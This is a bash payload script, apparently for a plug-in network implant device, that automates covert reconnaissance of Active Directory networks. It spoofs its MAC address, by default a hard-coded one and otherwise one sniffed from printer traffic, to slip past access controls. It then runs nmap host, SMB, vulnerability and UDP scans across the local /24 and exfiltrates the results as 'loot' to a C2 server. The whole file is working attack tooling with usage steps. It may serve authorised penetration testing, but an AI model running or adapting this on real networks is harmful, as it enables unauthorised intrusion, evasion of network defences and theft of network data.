#!/bin/bash
#############################################################################
# Title:                                                                    #
#     spoderman                           .:...                             #
#                                     .=*#%%%%%%#+=:.                       #
# Author:                           -*#%%%%%%%%%%%%%#=.                     #
#     irrrwin                      +%%%%%%%%%%%%%%%%%%*.                    #
#                                .+%%%%%%%%%%%%%%%%%%%%-                    #
# Description:                  :+-%%%%%%%%%%%%%##+@%%%%+.                  #
#     Network enumeration aimed -%%%%%%%%%%%%%@#:##%%%%%%#-                 #
#     at AD environments. Starts =%%%%%%%%%%%%%%%%%%%%%%%%%*:               #
#     with a /24 ping scan,then   -#%%%%%%%%%%%%%%%%%%%%%%%%#-              #
#     does an smb enumeration,      :=+*#%%%%%%%%%%%%%%%%%%%%%=             #
#     tcp vulners and finally            .:-+#%%%%%%%%%%%%%%%%#-            #
#     udp top50. Tries to ex-                 :+#%%%%%%%%%%%%%%%#=.         #
#     filtrate loot to C2.                   -*%%%%%%%%%%%%%%%%%%%%*-       #
#                                          :+%%%%%%%%%%%%%%%%%%%%%%%#*.     #
# Usage:                                  -%%%%%%%%%%%%%%%%%%%%%%%%%##=     #
#     1. install stuff                   -####%%%%%%%%@%%%%%%%%%%%####-     #
#     2. set up device.config           =######%%%%%%@@@%%%%%%%%%##*##+     #
#     3. plug to the network           +######%%%%%%%%@%%%%%%%%%%######-    #
#                                     -#######%%%%%%%%%%%%%%%%%%%#######:   #
#                                     +#######%%%%%%%%%%%%%%%%%%%%##**##*   #
#                                     -######*%%%%%%%%%%%%%%%%%%%%%######   #
#                                     .######*%%%%%%%%%%%%%%%%%%%%%######   #
#                                      ######+%%%%%%%%%%%%%%%%%%%%%%*####   #
#                                      *####::%%%%%%%%%%%%%%%%%%%%%%+:###   #
# Disclaimer:                                                               #
#     *This program is free software: you can redistribute it and/or modify #
#     it under the terms of the GNU General Public License as published by  #
#     the Free Software Foundation, either version 3 of the License, or (at #
#     your option) any later version.*                                      #
#                                                                           #
#     *You should have received a copy of the GNU General Public License    #
#     along with this program. If not, see http://www.gnu.org/licenses/ *   #
#                                                                           #
#############################################################################


# >>> SETTINGS >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
# ~~~~~~~~~~~~ EDIT BELOW ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C2PROVISION="/etc/device.config"
INTERFACE="eth0"
new_mac="DE:AD:BE:EF:13:37"
# ~~~~~~~~~~~~ EDIT ABOVE ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETTINGS <<<


# >>> SETUP >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
LOOT_DIR="/root/loot/spoderman" && mkdir -p "$LOOT_DIR" &> /dev/null
SCAN_DIR="$LOOT_DIR/scan-$(date +%s)" && mkdir -p "$SCAN_DIR" &> /dev/null

LOG="/root/log-spoderman.txt"
touch "$LOG"
# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< SETUP <<<


function log() {
    text="$1"
    echo -e "$(date "+%T")" "$text" >> "$LOG"
    SERIAL_WRITE [*] "$(date "+%T")" "$text"
}


function catch_printer_mac() {
    tcpdump -i "$INTERFACE" -n -e -s 1500 -c 1 -G 60 'ether proto 0x0800 and (port 515 or port 9100)' | awk '{print $2}'
}


function spoof_mac () { 
    NETMODE TRANSPARENT
    log "~~~~~~~~ looking for mac address to spoof"
    LED R VERYFAST
    if [[ -z "$new_mac" ]]; then
        new_mac=$(catch_printer_mac)
    fi
    if [[ -n "$new_mac" ]]; then
        ifconfig "$INTERFACE" down
        macchanger -m "$new_mac" "$INTERFACE" 
        ifconfig "$INTERFACE" up
        sleep 3
        log "~~~~~~~~ spoofing mac address: $new_mac"
    else
        log "~~~~~~~~ no mac address found for spoofing"
    fi
    NETMODE DHCP_CLIENT
}


function obtain_local_IP() { 
    log "~~~~~~~~ waiting for local IP"
    retries=30
    while ! ifconfig "$INTERFACE" | grep "inet addr"; do
        LED M VERYFAST
        sleep 1
        retries=$((retries - 1))
        if [[ $retries -eq 0 ]]; then
            spoof_mac
            retries=30
        fi
    done
    LOCALIP=$(ifconfig "$INTERFACE" | grep "inet addr" | awk {'print $2'} | awk -F: {'print $2'})
    GATEWAY=$(route | grep default | awk {'print $2'})
    LED SETUP
    log "~~~~~~~~ obtained local IP: $LOCALIP, gateway: $GATEWAY"
}
        

function obtain_public_IP() {
    log "~~~~~~~~ waiting for public IP"
    retries=10
    while [[ -z "$PUBLICIP" ]]; do
        PUBLICIP=$(curl icanhazip.com)
        LED C VERYFAST
        sleep 1
        retries=$((retries - 1))
        if [[ $retries -eq 0 ]]; then
            break
        fi
    done
    LED SETUP
    log "~~~~~~~~ obtained public IP: $PUBLICIP"
}


function stage1() {
    # Stage 1 - find live hosts
    log "~~~~~~~~ stage 1: scanning for live hosts"
    nmap -sn -PE -T4 "$LOCALIP"/24 -oG - --host-timeout 30s --max-retries 3 | awk '/Up$/{print $2}' | uniq | sort > "$SCAN_DIR"/nmap-live_hosts.txt 
    log "~~~~~~~~ done"
}

function stage2() {
    # Stage 2 - find windows hosts
    log "~~~~~~~~ stage 2: scanning for windows hosts"
    nmap -Pn -sS -T4 -p 445 --script smb-os-discovery.nse "$LOCALIP/24" -oG - | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > "$SCAN_DIR"/nmap-smb_hosts.txt
    log "~~~~~~~~ done"
}

function stage3() {
    # Stage 3 - scan main range TCP
    log "~~~~~~~~ stage 3: scanning main range TCP"
    nmap -Pn -sV --open --script vulners "$LOCALIP"/24 -oN "$SCAN_DIR"/nmap-"$LOCALIP"slash24_tcp_top-1000.txt
    log "~~~~~~~~ done"
}

function stage4() {
    # Stage 4 - scan main range UDP
    log "~~~~~~~~ stage 4: scanning main range UDP"
    nmap -sU -sV -sC --top-ports 50 --open "$LOCALIP"/24 -oN "$SCAN_DIR"/nmap-"$LOCALIP"slash24_udp_top-50.txt --host-timeout 30s --max-retries 3
    log "~~~~~~~~ done"
}


function exfiltrate_to_c2 {
    if [[ -f "$C2PROVISION" ]]; then
        LED SPECIAL
        log "~~~~~~~~ exfiltrating loot to c2 "
        C2CONNECT
        while ! pgrep cc-client; do
            sleep 1;
        done
        for file in $(ls "$SCAN_DIR"); do
            C2EXFIL STRING "$SCAN_DIR/$file" "scan-$file"
        done
        log "~~~~~~~~ loot collected"
    else
        LED R SOLID
        log "~~~~~~~~ c2 server not set up -> skipping exfiltration"
    fi
}


function setup() {
    log "~~~ setup started"
    NETMODE DHCP_CLIENT
    obtain_local_IP
    obtain_public_IP
    log "~~~ setup finished"
}


function cleanup() {
    log "~~~ cleanup started"
    sync
    exfiltrate_to_c2
    log "~~~ cleanup finished"
}


function run() {
    log "~~~~~~~~~ START ~~~~~~~~~"
    LED SETUP
    setup
    LED STAGE1
    stage1
    LED STAGE2
    stage2
    LED STAGE3
    stage3
    LED STAGE4
    stage4
    LED CLEANUP
    cleanup
    LED FINISH
    sleep 1
    halt
    log "~~~~~~~~~ STOP ~~~~~~~~~"
}


run &
